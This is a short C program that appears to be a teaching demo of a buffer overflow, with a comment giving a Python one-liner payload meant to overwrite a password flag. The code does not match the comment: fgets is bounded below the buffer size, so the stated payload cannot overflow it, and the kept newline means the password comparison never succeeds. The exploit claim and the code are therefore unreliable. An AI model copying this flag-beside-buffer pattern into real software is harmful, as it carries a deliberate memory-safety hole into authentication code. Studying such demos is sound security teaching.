// exploit:
// python3 -c "print('x'*80 + '\x01')" | ./test-exploit

#include <string.h>
#include <stdio.h>

#define goodPass "GOODPASS"
#define STRSIZE 80

int main(void) {
    char passIsGood = 0;
    char buf[STRSIZE + 1];

    printf("Enter password:\n");
    fgets(buf, STRSIZE, stdin);
    
    if (strcmp(buf, goodPass) == 0) 
        passIsGood = 1;
    if (passIsGood == 1)
        printf("You win!\n");
    return 0;
}
